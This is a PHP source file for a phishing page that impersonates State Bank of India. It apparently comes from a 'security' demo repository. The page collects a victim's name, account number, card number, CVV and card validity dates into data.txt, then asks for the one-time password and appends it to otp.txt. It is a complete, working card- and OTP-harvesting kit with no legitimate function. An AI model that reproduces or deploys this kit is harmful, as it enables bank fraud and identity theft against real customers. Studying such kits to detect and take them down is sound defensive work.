<?php
$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
    $otp = htmlspecialchars($_POST['otp']);
    file_put_contents("otp.txt", "OTP: $otp\n", FILE_APPEND);
    $message = "OTP saved successfully!";
} elseif ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $accountNumber = htmlspecialchars($_POST['accountNumber']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $validFrom = htmlspecialchars($_POST['validFrom']);
    $validUpto = htmlspecialchars($_POST['validUpto']);

    $data = "Name: $name\nAccount Number: $accountNumber\nCard Number: $cardNumber\nCVV: $cvv\nValid From: $validFrom\nValid Upto: $validUpto\n\n";
    file_put_contents("data.txt", $data, FILE_APPEND);

    $message = "Information submitted successfully! Please enter the OTP.";
    $showOtpForm = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI Information Form</title>
    <link rel="stylesheet" href="https://mrfidal.github.io/security/sbi/style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://mrfidal.github.io/security/sbi/SBI-logo.svg" alt="SBI Logo">
            <h1>SBI Information</h1>
        </div>

        <?php if (!isset($showOtpForm)): ?>
            <form id="infoForm" method="POST">
                <div class="input-group">
                    <label for="name">Name</label>
                    <input type="text" id="name" name="name" required>
                </div>
                <div class="input-group">
                    <label for="accountNumber">Account Number</label>
                    <input type="text" id="accountNumber" name="accountNumber" required>
                </div>
                <div class="input-group">
                    <label for="cardNumber">Card Number</label>
                    <input type="text" id="cardNumber" name="cardNumber" required>
                </div>
                <div class="input-group">
                    <label for="cvv">Card Verification Value (CVV)</label>
                    <input type="text" id="cvv" name="cvv" required maxlength="3" pattern="\d{3}" title="Enter a valid CVV (3 digits)">
                </div>
                <div class="input-group">
                    <label for="validFrom">Valid From</label>
                    <input type="date" id="validFrom" name="validFrom" required>
                </div>
                <div class="input-group">
                    <label for="validUpto">Valid Upto</label>
                    <input type="date" id="validUpto" name="validUpto" required>
                </div>
                <button type="submit">Submit</button>
                <p id="message"><?= isset($message) ? $message : ''; ?></p>
            </form>
        <?php else: ?>
            <div class="otp-container" id="otpContainer" style="display: block;">
                <h2>Enter OTP</h2>
                <form method="POST">
                    <div class="input-group">
                        <input type="text" id="otpInput" name="otp" placeholder="Enter OTP" required>
                    </div>
                    <button type="submit">Verify OTP</button>
                    <p id="timer">05:00</p>
                </form>
                <p id="message"><?= isset($message) ? $message : ''; ?></p>
            </div>
        <?php endif; ?>
    </div>

    <script src="https://mrfidal.github.io/security/sbi/script.js"></script>
</body>
</html>
